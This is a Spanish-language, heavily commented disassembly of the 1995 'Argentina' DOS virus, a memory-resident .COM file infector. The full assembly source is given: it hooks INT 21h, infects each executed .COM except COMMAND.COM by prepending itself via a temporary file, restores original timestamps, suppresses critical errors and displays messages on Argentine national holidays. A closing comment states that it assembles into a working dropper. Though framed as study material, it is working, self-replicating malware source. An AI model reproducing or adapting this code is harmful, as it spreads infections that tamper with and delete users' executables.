; Virus Argentina.
; Desensamblado y An lisis Realizado Por Walt DiZnEy.
; Archivo Azul Nro. 001; 15/8/1995.


Segmento	segment	byte public
		assume	cs:Segmento, ds:Segmento


		org	100h

Start:


; **************************************************************************
; *************************** BLOQUE PRINCIPAL *****************************
; **************************************************************************


Argentina	Proc	Near

		; Saltamos Por Arriba De Una Zona De Datos, Buffers, Etc...

		jmp	short ComienzoDelVirus

		; ...Esos Datos...

		Nop

MarcaVirus	db	1Ah, 'Argentina Virus',0,'1.00'

SizeInP		dw	00h
OldInt21h	Dw	00,00h
OldInt24h	Dw	00,00h
HostCsIp	dw	00h
SaveAx		dw	00h
ViralSp		dw	00h
OrgFileDate	dw	00h
OrgFileTime	dw	00h

		; Bloque De Par metros Para Ejecuci¢n De Archivo Hu‚sped.
		; Pueden Encontrar Una Descripci¢n Un Poco M s Completa En
		; Un Libro De DOS Como Los De Ray Duncan, Norton, Etc.
		; N¢tese que en el puntero al bloque de entorno colocamos
		; cero, con lo cual el programa hijo (ser  el hu‚sped)
		; obtiene una copia del bloque de entorno del programa
		; padre (el que lo ejecuta, o sea, el virus). 
		; Observemos tambi‚n que a cada otro valor (l¡nea de
		; comando, FCBs...) le pasamos los mismos del padre,
		; por lo que les damos el segmento del virus, y la 
		; ubicaci¢n de cada valor en el PSP del virus.

ParamBlock:
		Dw	 0000h	   ; Puntero De Segmento, Bloque De Entorno.

		Dw	 0080h 	   ; OffSet De Par metros De L¡nea De Comando.
HereGoesCs1	dw	 0000h	   ; Segmento De Par metros De L¡nea De Cmd.

		dw	 005Ch	   ; OffSet Del Primer FCB.
HereGoesCs2	dw	 0000h	   ; Segmento Del Primer FCB.

		dw	 006Ch     ; OffSet Del Segundo FCB.
HereGoesCs3	dw	 0000h     ; Segmento Del Segundo FCB.


		; Aqu¡ Toma El Control El Virus.

ComienzoDelVirus:

		; Esta Es Una Forma Muy Interesante De Llamar Al Programa
		; Original. Si El Virus Est  Instalado, Al Llamar A Esta
		; Funci¢n Con Esos Par metros, Se Ejecutar  El Programa
		; Original. 
		; Si El Virus No Esta Instalado, Normalmente, La Ejecuci¢n
		; Continuar .
		; Como Puede Verse, Se Le Pasan Ciertos Par metros A La
		; Funci¢n; Eso Se Explicar  M s Adelante.

		; Salvamos Ax.

		mov	SaveAx,ax

		; Llamamos A La Funci¢n Del Virus.

		mov	di,100h
		mov	si, OffSet EndVirus
		mov	cx,0FF00h
		sub	cx, OffSet EndVirus
		mov	ah,0FAh			; Definida Por El Virus.
		int	21h			

		; Obtenemos Ahora El Vector De La Interrupci¢n 21h, Mediante
		; La Funci¢n 35h Del DOS.

		mov	ax,3521h
		int	21h			

		; Salvamos El Vector Original De La Int21h En OldInt21h.
						
		mov	OldInt21h,bx
		mov	word ptr OldInt21h+2,es

		; Hacemos Apuntar El Vector De La Int21h A La Porci¢n Residente
		; Del Virus.

		mov	ax,2521h
		mov	dx,offset NewInt21h
		int	21h			

		; Cambiamos El Tama¤o Del Bloque De Memoria.
		; Funci¢n 4Eh Del DOS. Es Contiene La Direcci¢n De Segmento
		; Del Bloque A Modificar, y Bx El Tama¤o Deseado En P rrafos.

		mov	ah,4Ah			

		; Cargamos En Bx El Tama¤o Del C¢digo Del Virus En Bytes
		; + 256 Bytes Para El PSP.

		mov	bx, OffSet EndVirus	

		; Llevamos El Stack Al Final Del C¢digo Del Virus.

		mov	sp, OffSet EndVirus	; 'Salvamos' El Stack.
		push	ds			; Es <-- Ds.
		pop	es
		
		; Le Sumamos 15 A Bx, Para Redondear El N£mero.
		 
		add	bx,0Fh			

		; Convertimos A P rrafos.		

		shr	bx,1			
		shr	bx,1
		shr	bx,1
		shr	bx,1

		; Salvamos Esa Cantidad De P rrafos.

		mov	SizeInP,bx

		; Cambiamos El Tama¤o Del Bloque De Memoria, y Liberamos
		; Toda La Memoria Que No Us bamos.

		int	21h			

		; Ahora Vamos A Ejecutar El Hu‚sped Mediante La Funci¢n
		; 4Bh, Subfunci¢n 00h Del DOS.

		; Primero, Preparamos El Bloque De Par metros.		

		mov	HereGoesCs1,cs
		mov	HereGoesCs2,cs
		mov	HereGoesCs3,cs

		; Vamos a Buscar El Nombre Del Hu‚sped En El Environment.
		; Hacemos Apuntar Es:Di Al Comienzo Del Bloque De Environment.

		mov	es, Word Ptr Ds:[02Ch]

		; Buscamos El Nombre Del Host En El Bloque De Environment.

		xor	di,di		; Di <-- 0
		xor	ax,ax		; Ax <-- 0
		mov	cx,0FFFFh	; Cx <-- 64Kb.
Bucle_1:
		repne	scasb
		cmp	byte ptr es:[di],0
		je	EjecutarHost
		scasb
		jnz	Bucle_1

		; Una Vez Hallado, Hacemos Apuntar Ds:Dx A Esa Cadena
		; AsciiZ (Seg£n Lo Requerido Por Ah=4Bh). Es:Bx Apunta
		; Al Bloque De Par metros Que Ya Hab¡amos Preparado.

EjecutarHost:
		mov	dx,di
		add	dx,3
		push	es			; Es <-- Ds.
		pop	ds
		mov	ax, 4B00h
		mov	bx, OffSet ParamBlock
		push	cs
		pop	es

		; Ejecutamos El Hu‚sped.

		pushf
		call	dword ptr cs:OldInt21h

		; Obtenemos El C¢digo De Retorno De La Ejecuci¢n Del Hu‚sped
		; En Ax (Nos Interesa El C¢digo De Retorno Emitido; Lo
		; Devolveremos Normalmente Cuando El Virus Devuelva El Control
		; Al DOS).

		mov	ah,4Dh
		int	21h			

		; Terminar y Quedar Residente!
		; En Al Va El C¢digo De Retorno (Que Ya Obtuvimos), y En Bx
		; El N£mero De P rrafos A Dejar Residentes (Que Ya Hab¡amos
		; Salvado Antes).

		mov	ah,31h			
		mov	dx, Word Ptr [cs:SizeInP]
		int	21h			
						

		; La Rutina, a Continuaci¢n, Chequea La Fecha De Activaci¢n,
		; y Si Es Alguna V lida, Muestra Los Mensajes Correspondientes.
		; Luego Devuelve El Control A La Int21h Original, Se Haya
		; Mostrado Alg£n Mensaje O No.

SalidaVirus:
		; Ds <-- Cs. (Evidentemente, Porque Usaremos Ds:Dx Para
		; Apuntar A Los Mensajes, Dentro Del C¢digo V¡rico).

		push	cs
		pop	ds

		; Obtenemos La Fecha Mediante Funci¢n 2Ah Del DOS. 
		; Resultado: cx=A¤o, Dh=Mes, Dl=D¡a, Al=D¡a De La Semana.

		mov	ah,2Ah
		int	21h			

		; Verificamos Si Hoy Es Una Fecha Patria Argentina, y Si
		; Es As¡, Mostramos El Mensaje Correspondiente a Ella.

		; ¨Es 25 De Mayo?

		cmp	dx,519h
		je	Es25DeMayo

		; ¨Es 20 De Junio?

		cmp	dx,614h
		je	Es20DeJunio

		; ¨Es 9 De Julio?

		cmp	dx,709h
		je	Es09DeJulio

		; ¨Es 17 De Agosto?

		cmp	dx,811h
		je	Es17DeAgosto

		; No Es Ninguna De Ellas. Salimos De Esta Rutina.

		jmp	short Salir
		Nop

Es25DeMayo:
		mov	dx, OffSet Msg_25
		jmp	short MostrarMensaje
		Nop
Es20DeJunio:
		mov	dx, OffSet Msg_20
		jmp	short MostrarMensaje
		Nop
Es09DeJulio:
		mov	dx, OffSet Msg_09
		jmp	short MostrarMensaje
		nop
Es17DeAgosto:
		mov	dx, OffSet Msg_17

MostrarMensaje:

		; Mostramos El Mensaje Correspondiente A La Fecha.

		mov	ah,9
		int	21h			

		; Mostramos El Mensaje 'Est ndar' A Toda Activaci¢n.
		; (Nombre Del Virus, Etc).

		mov	dx,offset VirusMsg
		mov	ah,9
		int	21h			

		mov	dx,offset PressAKey
		mov	ah,9
		int	21h			

		; Esperamos La Pulsaci¢n De Una Tecla...
		; (Funci¢n 00h, Int16h: Esperar Entrada Por Teclado En Al).

		mov	ah,0
		int	16h			

		; Agregamos Un LineFeed Al Final Del Mensaje...

		mov	dx,offset LineFeed
		mov	ah,9
		int	21h			

		; Salimos De Esta Rutina...
Salir:
		; Restauramos El Stack Del Virus.

		mov	sp, Word Ptr [cs:ViralSp]

		; Restauramos Es, Ds, Di, Si, Dx, Cx, Bx, Ax.
		; (Importante Haber Restaurado Sp, Ya Que Estaban En La
		; Pila, Obviamente!)

		pop	es
		pop	ds
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax

		; Restauramos El Ss:Sp Del Programa Original.

		mov	ss,cs:SaveSs
		mov	sp,cs:SaveSp

		; ...Y Llamamos A La Vieja Int21h.

		jmp	short Vieja21h
		Nop

		endp


; **************************************************************************
; **************************** PROCEDIMIENTOS ******************************
; **************************************************************************

; 1) NewInt21h	:  El Manejador De La Int21h Instalado Por El Virus.

NewInt21h	Proc	Near

		; ...Salvamos Los Flags En El Stack...

		pushf

		; Ahora Vemos Cu l De Los 'Servicios' De La Int21h Viral
		; Se Pidi¢... ;)

		; Ah = 0FAh : Ejecuci¢n Del Hu‚sped.

		cmp	ah,0FAh
		je	YaResidente

		; Ah = 4B00h : Cargar y Ejecutar Programa. El Virus La
		;	       'Captura' Para Infectar Esos Programas Que
		;	       Se Ejecutan.

		cmp	ax,4B00h
		je	Infectar

		; Nada De Eso...Pasamos El Control A La Int21h Original.

Vieja21h:
		popf
		jmp	dword ptr cs:OldInt21h


		; El Virus Llama A Esta Funci¢n Propia (Normalmente El DOS
		; No La Usa) Para Ejecutar Al Hu‚sped Cuando El C¢digo 
		; V¡rico Ya Est  Instalado En Memoria.

YaResidente:
		; Sacamos Flags e Ip Del Stack. (Perdemos Ambos Valores,
		; S¢lo Lo Hacemos Para 'Sacarlos De Ah¡').

		pop	ax
		pop	ax

		; Ax <-- 100h.

		mov	ax,100h

		; Salvamos Ax=100h En Una Posici¢n De Memoria A Tal Prop¢sito.

		mov	cs:HostCsIp,ax

		; Sacamos Cs Del Stack.

		pop	ax

		; Salvamos Cs En A Continuaci¢n De Donde Guardamos Ip.
		; (De Esa Forma, Esa Posici¢n De Memoria Apunta Al Comienzo
		; Del Host).

		mov	word ptr [cs:HostCsIp+2],ax

		; Ahora, Se 'Restaura' El Programa Original Para Su Ejecuci¢n.
		; Movemos Todo El .COM (Que Hab¡a Quedado 'Despu‚s' Del
		; Virus) Al Principio Del Bloque De Memoria). Recordemos Que
		; Llam bamos A Esta Funci¢n Con:	
		; Si= OffSet Del Final Del Virus; Comienzo Del C¢digo
		;     Original.
		; Di= 100h (OffSet De Comienzo De Un Programa .COM, A Donde
		;     Moveremos Al Hu‚sped Ahora).
		; Cx= N£mero De Bytes A Mover (Sera Todo Lo Que Qued¢ En El
		;     Bloque De Memoria, Despu‚s Del Virus)

		rep	movsb

		; Ax <-- 0 y A La Pila!

		xor	ax,ax
		push	ax

		; Restauramos El Valor De Ax Salvado.

		mov	ax, Word Ptr [Cs:SaveAx]

		; ...Y Saltamos Al Comienzo Del Hu‚sped (Con Lo Cual 
		; Ejecutamos Normalmente Al Mismo y Listo! ;)).
		; (Notemos Que Lo Que Hace La Rutina Es Cargar Al Hu‚sped
		; Al Principio Del Bloque, Como Lo Hubiera Hecho Si No
		; Estuviera El Virus Antes; Luego Lo Ejecuta Como Si Se
		; Hubiera Ejecutado Normalmente).

		jmp	dword ptr cs:HostCsIp

		; Ac  Se Guardan Los Ss:Sp Originales.

SaveSp		dw	5FBh
SaveSs		dw	0E3Ch


		; Est  Subrutina Realiza La Infecci¢n Del Archivo Ejecutado.

Infectar:
		; Salvamos Los Ss:Sp Originales En Posiciones De Memoria
		; A Tal Prop¢sito. (O Sea, Salvamos La Localizaci¢n Del
		; Stack).

		mov	cs:SaveSp,sp
		mov	cs:SaveSs,ss

		; Ahora Vamos A 'Crear' Un Stack Para El Virus, De Forma
		; Que Podamos Usarlo Sin Peligro. 

		; Ss <-- Cs. (O Sea, El Segmento Del Stack Ser  El Usado
		;	      Por El C¢digo Del Virus).

		push	cs
		pop	ss

		; Sp <-- Sp. (O Sea, El Puntero Del Stack Estar  'Al Fondo'
		; 	      Del Cuerpo Del Virus, En Un Espacio A Tal
		; 	      Prop¢sito).

		mov	sp,5E1h

		; 'Creado' Nuestro Stack, Podemos Salvar Todos Los Registros
		; Ah¡ Sin Peligro. 

		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	ds
		push	es

		; Guardamos La Localizaci¢n Del Sp Del 'Stack Del Virus', Ya
		; Que Necesitaremos Saber Donde Est , M s Adelante.

		mov	cs:ViralSp,sp

		; ¨Cu l Es La Unidad De Disco Por Defecto?
		; (Resultado En Al: 0=A:, 1=B:, Etc...)
		; Usamos Funci¢n 019h Del DOS.

		mov	ah,19h
		int	21h			

		; Le Sumamos 41h (65 Decimal) Al N£mero Obtenido En Al.
		; De Esta Forma, Obtenemos En Al El C¢digo Ascii De La
		; Unidad Por Defecto.
		; (Ej: 0 --> 'A' ; 1 --> 'B' ; Etc).

		add	al,41h			

		; Salvamos Esa Informaci¢n En Una Posici¢n A Tal Prop¢sito.
		; (Comienzo De La Cadena AsciiZ Con El Nombre Del Programa
		; A Infectar).

		mov	Byte Ptr [Cs:HostString], al

		; Tambi‚n Lo Salvamos Como Drive Del Archivo Auxiliar.
		; (Veremos Esto M s Adelante).

		mov	byte ptr [Cs:AuxFile],al

		; A Continuaci¢n, 'Armamos' El Path y Nombre Del Archivo
		; A Infectar.

		; Di <-- Lugar A Guardar Path y Nombre.

		mov	di,offset Path&Name

		; Salvamos En La Pila.

		push	di

		; Si <-- Lugar Donde Est n El Path y Nombre Completos. 
		;	 (4B00h Los Requiere En Ds:Dx).

		mov	si,dx

		; El Path En Dx...¨Incluye El Drive?. Si Lo Incluye, Lo
		; Tomamos De Ah¡. Si No Lo Incluye, Tomamos El Drive Por
		; Defecto Que Ya Hab¡amos Salvado.

		cmp	byte ptr [si+1], ':'
		jne	CopiarPath

		; S¡; Entonces Tom‚moslo De Ah¡ Directamente, y Guard‚moslo
		; Donde Hab¡amos Guardado El Drive Por Defecto Para El
		; Hu‚sped. Hacemos Lo Mismo Para El Drive Del Archivo
		; Auxiliar.

		mov	al,[si]
		mov	Byte Ptr [cs:HostString],al	; Hu‚sped.
		mov	byte ptr [Cs:AuxFile],al	; Auxiliar.

		; Le Sumamos 2 A Si; Entonces, Si Apunta Directamente Al
		; Path Del Archivo, Sin Incluir Drive.

		add	si,2

		; Copiamos El Path y Nombre De Archivo A La Posici¢n
		; Destinada A Ese Fin.
CopiarPath:
		; Es <-- Cs.
		push	cs
		pop	es

		; Copiamos 63 Bytes...

		mov	cx,3Fh

BucleCopia:
		; Al <-- [Si]

		lodsb

		; Aparentemente, Intenta Transformar Las Min£sculas a
		; May£sculas, Pero Lo Hace Incorrectamente.

		cmp	al,61h			; Anterior A 'a'?
		jb	RepiteBucle
		cmp	al,7Ah			; Entre 'a' y 'z'?
		ja	RepiteBucle
		add	al,0E0h
RepiteBucle:
		; Copia El Caracter, y Sigue Con El Bucle.

		stosb
		loop	BucleCopia

		; Recuperamos Di. (Apunta Al Comienzo De La Cadena De Path
		; y Nombre).

		pop	di

		; Cs <-- Ds.

		push	cs
		pop	ds

		; Buscamos Un '.' En La Cadena AsciiZ. (Estamos Buscando
		; La Localizaci¢n De La Extensi¢n, Para Determinar Si Es
		; Un .COM o No).

		mov	cx,40h
		mov	al,'.'
		repne	scasb

		; La Hallamos. Veamos Ahora Si Es Un '.COM', Compar ndola
		; Con Una Cadena A Tal Prop¢sito.

		mov	cx,3
		mov	si,(offset CommandStr+7)
		repe	cmpsb

		; Si Es Un '.COM'...

		jz	HallamosCOM

		; No Es Un '.COM', Retornamos.

		jmp	SalidaVirus

		; Va A Restaura&Sale. (Este Est  Aqu¡ Por El T¡pico
		; Relative Jump Out Of Range).

Restaurar&Salir:

		jmp	Restaura&Sale

		; Sabemos Que Es Un '.COM'; Pasamos a Partes M s Espec¡ficas
		; De La Infecci¢n.
HallamosCOM:
		; ¨Es El Command.Com?
		; (Comparamos El String En Di Con Un String Que Tiene El
		;  Virus A Tal Prop¢sito).

		sub	di,0Bh
		mov	cx,7			; 7 Bytes...
		mov	si,offset CommandStr	; String 'Command'
		repe	cmpsb

		; No Es El Command.Com, Sigamos Viendo Si Podemos Infectar.

		jnz	Continuamos

		; Es El Command.Com, No Lo Infectamos. Retornamos.

		jmp	SalidaVirus
Continuamos:
		; Instalamos Un Manejador Para La Int24h, 'Critical Error
		; Handler'.

		mov	ax,3524h
		int	21h			

		; Salvamos Viejo Vector.

		mov	Word Ptr cs:[OldInt24h],bx
		mov	Word Ptr cs:[OldInt24h+2],es

		; Seteamos Nuevo Vector.

		mov	ax,2524h
		push	cs
		pop	ds
		mov	dx,offset NewInt24h
		int	21h			

		; Comienza La Parte Espec¡fica De La Infecci¢n.

		; Abrimos El Archivo Cuyo Drive/Nombre/Path Ya Guardamos
		; En El OffSet HostString.
		; (Abrimos Para Lectura: Al=00h).

		mov	dx,offset HostString
		mov	ax,3D00h
		int	21h			

		; Pasamos El Handle A Bx.

		mov	bx,ax

		; Leemos 09h Bytes Del Archivo, En Un Buffer.

		mov	dx,offset Buffer
		mov	cx,9
		mov	ah,3Fh
		int	21h			

		; Si Hubo Alg£n Error, Restauramos La Vieja Int24h, y
		; Retornamos.

		jc	Restaurar&Salir

		; Obtenemos La Fecha y Hora Del Archivo, y Los Salvamos.
		; (Funci¢n 57h Del DOS; Retorna: Cx=Hora, Dx=Fecha).

		mov	ax,5700h
		int	21h			

		mov	OrgFileDate,dx
		mov	OrgFileTime,cx

		; Cerramos El Archivo.

		mov	ah,3Eh
		int	21h			

		; ¨Est  Infectado? : Buscamos La 'Marca' Del Virus.

		mov	ax, Word Ptr [Buffer+3]
		cmp	ax, Word Ptr [MarcaVirus]

		; S¡; Retornamos.

		je	Restaurar&Salir

		; No Est  Infectado; Pasamos a Infectar.

		; Creamos Un Archivo Auxiliar.
		; (Funci¢n 3Ch Del DOS).

		mov	dx,offset AuxFile
		mov	ah,3Ch			
		xor	cx,cx			; Atributos = 0.
		int	21h			

		; Si No Pudimos, Retornamos.

		jc	Restaurar&Salir

		; Pasamos El Handle A Bx.

		mov	bx,ax

		; Escribimos El C¢digo Del Virus En Ese Archivo Auxiliar.
		; (Funci¢n 40h Del DOS; Requiere: Bx=Handle; Cx=Nro. Bytes,
		;  Dx=Buffer A Escribir).

		mov	dx,100h
		mov	cx,4E1h
		mov	ah,40h
		int	21h			

		; Si Hubo Alg£n Error, Retornamos.

		cmp	ax,cx
		jne	Restaurar&Salir

		; Salvamos El Handle Del Archivo Auxiliar.

		mov	SaveHandle,bx

		; Ahora Abrimos El Hu‚sped Para Lectura.
		; (Funci¢n 3Dh Del DOS, Etc...)

		mov	dx,offset HostString
		mov	ax,3D00h
		int	21h			

		; Si No Pudimos, Retornamos.

		jc	Restaurar&Salir_2

		; Pasamos El Handle A Bx.

		mov	bx,ax

		; Salvamos El Handle En El Stack.

		push	bx

		; Reservamos Memoria Para Un Buffer Auxiliar. (Ya Que
		; Copiaremos Todo El Hu‚sped A Continuaci¢n Del Virus, En
		; El Archivo Auxiliar).
		; (Usamos La Funci¢n 48h Del DOS; Requiere: Bx=P rrafos
		; A Reservar; Retorna: Ax:0000=Comienzo De La Memoria
		; Otorgada).

		mov	bx,500h		; 500h P rrafos --> 20Kb
		mov	ah,48h
		int	21h			

		; Recuperamos Handle.

		pop	bx

		; Dx <-- 00; Ds <-- Ax. Con Esto, Ds:Dx Apunta Al Comienzo
		; De La Memoria Asignada).

		xor	dx,dx
		mov	ds,ax
CopiaArchivo:
		; Leemos 20Kb Del Hu‚sped Al Buffer En Ds:Dx. (El Que
		; Reci‚n Asignamos).

		mov	cx,5000h
		mov	ah,3Fh
		int	21h			

		; Si No Pudimos, Retornamos.

		jc	Restaurar&Salir_2

		; ¨Ya Termin¢ El Archivo Hu‚sped? (La Funci¢n 3Dh Devuelve
		; 00h En Ax Si Se Intent¢ Leer Desde El 'Fin' Del Archivo).

		cmp	ax,0

		; S¡; El 'Bloque' Del Hu‚sped Que Cargamos En Memoria Es
		; El Ultimo Del Archivo (O Bien El Ultimo).

		je	FinCopia

		; Copiamos El Contenido Del Buffer Al Archivo Auxiliar.
		; (N¢tese Que Intercambiamos El Handle Del Hu‚sped Con El
		; Handle Del Auxiliar).

		mov	cx,ax			; Bytes En Cx.
		xchg	cs:SaveHandle,bx
		mov	ah,40h			; Escribimos...
		int	21h			

		; Si Hubo Error, Retornamos.

		cmp	ax,cx
		jne	Restaurar&Salir_2

		; Volvemos A Intercambiar Los Handles, Con Lo Cual, Tenemos
		; En Bx El Handle Del Hu‚sped.

		xchg	cs:SaveHandle,bx

		; Seguimos Con El Proceso, Hasta Copiar Todo El Hu‚sped
		; Al Auxiliar.

		jmp	short CopiaArchivo


		; Este 'Restaurar&Salir_2' Es An logo Al Anterior; Est 
		; Aqu¡ Por El Famoso $#%@! 'Relative Jump Out Of Range'.

Restaurar&Salir_2:

		jmp	short Restaura&Sale
		Nop

		; Ya Terminamos De Copiar El Virus y El Hu‚sped Al Auxiliar.
		; (N¢tese Que En El Auxiliar Qued¢ Primero El Virus, y
		; Luego El Hu‚sped).
FinCopia:
		; Liberamos La Memoria Que Hab¡amos Reservado Para El Buffer
		; De Copiado.
		; (Utilizamos Funci¢n 49h Del DOS; Requiere: Es=Segmento De
		; Comienzo Del Bloque De Memoria A Liberar).
		; (N¢tese Que Pasamos Ds A Es, Ya Que Hab¡amos Pasado El
		; Comienzo Del Bloque A Ds, Anteriormente).

		push	ds			
		pop	es			; Es <-- Ds.
		mov	ah,49h			; Liberamos!
		int	21h			

		; Es <-- Cs.
		; Ds <-- Cs.

		push	cs
		push	cs
		pop	es
		pop	ds

		; Cerramos El Archivo Hu‚sped.

		mov	ah,3Eh
		int	21h			

		; Si No Pudimos, Retornamos.

		jc	Restaurar&Salir_2

		; Recuperamos El Handle Del Auxiliar.

		mov	bx,SaveHandle

		; Le Colocamos Al Auxiliar La Fecha y Hora Originales Del
		; Hu‚sped.
		; (Usamos Funci¢n 57h, Subfunci¢n 01h: Establecer La Fecha			; y Hora De Un Archivo).

		mov	ax,5701h
		mov	dx,OrgFileDate		; Fecha
		mov	cx,OrgFileTime		; Hora
		int	21h			

		; Cerramos El Archivo Auxiliar.
		
		mov	ah,3Eh
		int	21h			

		; Si No Pudimos, Retornamos.
		
		jc	Restaurar&Salir_2

		; Le 'Borramos' Todos Los Atributos Al Hu‚sped.
		; (Funci¢n 43h, Subf. 01h: Colocar A Un Archivo (En Dx)
		; Los Atributos En Cx).

		xor	cx,cx
		mov	dx,offset HostString
		mov	ax,4301h
		int	21h			

		; Borramos El Archivo Hu‚sped.

		mov	ah,41h
		int	21h			

		; Renombramos El Archivo Auxiliar Con El Nombre Del Hu‚sped.
		; (Funci¢n 56h Del DOS: Renombrar Archivo En Ds:Dx Con El
		;  Nombre En Es:Di).

		mov	dx,offset AuxFile
		mov	di,offset HostString
		mov	ah,56h
		int	21h			

		; Finalizada La Infecci¢n, Retornamos.

		jmp	short Restaura&Sale
		Nop

		endp


; 2) NewInt24h  :  Manejador De Errores Cr¡ticos Instalado Por El Virus.

NewInt24h	proc	Near

		; Retornar 0 En Al --> 'Sin Error'.
		xor	al,al

		; Retorno De Interrupci¢n.

		iret
		endp


		; Esta Rutina A Continuaci¢n, Restaura El Viejo Manejador
		; De Errores Cr¡ticos (O Sea, Restaura La Vieja Int24h), y
		; Luego Va Al 'Proceso De Salida' Del Virus.

Restaura&Sale:
		mov	dx,cs:OldInt24h		; Recuperamos El Viejo Vector.
		mov	ds,cs:[OldInt24h+2]
		mov	ax,2524h		; Setear Vector...
		int	21h			

		; Salida Del Virus (Chequeo De Activaci¢n y Salida En S¡).

		jmp	SalidaVirus


; **************************************************************************
; ************************* DATOS, BUFFERS, ETC ****************************
; **************************************************************************

		; Cadena Donde Se Guarda El Nombre Del Hu‚sped.

HostString	Db	00h		; Aqu¡ Ir  El Drive...
		Db	':'
Path&Name	Db	05Eh dup (0)

		; Cadena Para Chequeo De 'Command.Com'.

CommandStr	Db	'COMMANDCOM'

		; Drive y Nombre Del Archivo Auxiliar.

AuxFile		Db	00h			; Aqu¡ Ir  El Drive...
		Db	':'
		Db	'MOM.MOM', 0		; Nombre...

		; Todos Los Mensajes De Las Fechas De Activaci¢n...
	
Msg_25:		db	'25 de Mayo Declaraci¢n '
		db	'de la independencia Argentina', 0Ah
		db	0Dh, '$'

Msg_20:		db	'20 de Junio Dia de la bandera Ar'
		db	'gentina', 0Ah, 0Dh, '$'

Msg_09:		db	'9 de Julio Dia de la independenc'
		db	'ia Argentina', 0Ah, 0Dh, '$'

Msg_17		db	'17 de Agosto Aniversario de la d'
		db	'efunci¢n del Gral. San Martin', 0Ah
		db	0Dh, '$'

VirusMsg	Db	'Argentina Virus escrito por AfA '
		db	'- Virus benigno - ENET 35', 0Ah, 0Dh
		db	'$'

PressAKey	Db	'Pulse una tecla para continuar..'
		db	'.$'

LineFeed	db	0Ah, 0Dh, '$'

		; Buffer De 9 Bytes; Se Usa Para Chequear La Infecci¢n.

Buffer		db	09h Dup(0)

		; Aqu¡ Salvamos El Handle De Turno. ;)

SaveHandle	dw	00h

		; El Espacio A Continuaci¢n Es Utilizado Por El Virus
		; Como Stack.

		Db	052h Dup(0)
EndVirus:

		; 'Hu‚sped Auxiliar'. Lo Necesitamos Para Obtener Un
		; 'Dropper' Funcional Del Virus Al Ensamblarlo.

		Int	20h

Segmento	ends



		end	start
